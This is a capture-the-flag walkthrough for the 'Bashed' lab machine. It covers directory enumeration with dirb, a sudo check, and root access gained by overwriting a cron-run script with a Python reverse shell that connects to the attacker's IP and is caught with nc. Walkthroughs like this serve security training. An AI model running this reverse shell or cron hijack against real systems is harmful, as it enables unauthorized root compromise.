# Bashed - 10.10.10.68

## Discover existing php shell with dirb
```bash
root@other-barry:~/Downloads# dirb http://10.10.10.68 /usr/share/dirb/wordlists/common.txt

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Sun Feb 18 11:44:31 2018
URL_BASE: http://10.10.10.68/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://10.10.10.68/ ----
==> DIRECTORY: http://10.10.10.68/css/
==> DIRECTORY: http://10.10.10.68/dev/
==> DIRECTORY: http://10.10.10.68/fonts/
==> DIRECTORY: http://10.10.10.68/images/
+ http://10.10.10.68/index.html (CODE:200|SIZE:7743)
==> DIRECTORY: http://10.10.10.68/js/
```

## Determine Sudo Permissions
```bash
sudo -l
```

We can switch to user scriptmanager, let's look around in the root directory and see if there's anything interesting.

Looks like we can write to a file in scripts that'll get executed by a cronjob that runs as root.

## Create reverse shell
There were some issues writing directly to the test.py file, even as scriptmanager. So we'll create a copy of the script we want on the /dev/shm device.

```bash
sudo -u scriptmanager echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.157",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > /dev/shm/testlooser.py
```

start listening on our attacker box to catch the reversse shell:
```bash
nc -nvlp 8080
```
and copy the file to the desired location
```bash
sudo -u scriptmanager cp /dev/shm/testlooser.py /scripts/test.py
```
now we wait for the cronjob to run
```
root@other-barry:~/Downloads# nc -nvlp 8080
listening on [any] 8080 ...
connect to [10.10.15.157] from (UNKNOWN) [10.10.10.68] 53508
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
```
aaaaand, we're root.
